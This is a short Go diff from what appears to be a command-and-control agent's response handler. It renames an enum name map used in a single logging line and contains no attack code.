@@ -339,7 +339,7 @@ func (a *Agent) ProcessResponse(response []string) {
 					log.Printf("error decoding status from c2 response: %q, (err: %q)\n", response[i], err)
 					return
 				}
-				log.Printf("c2 status code: %s\n", C2ResponseStatus_name[int32(responseStatus)])
+				log.Printf("c2 status code: %s\n", C2Response_name[int32(responseStatus)])
 				return
 			}
 
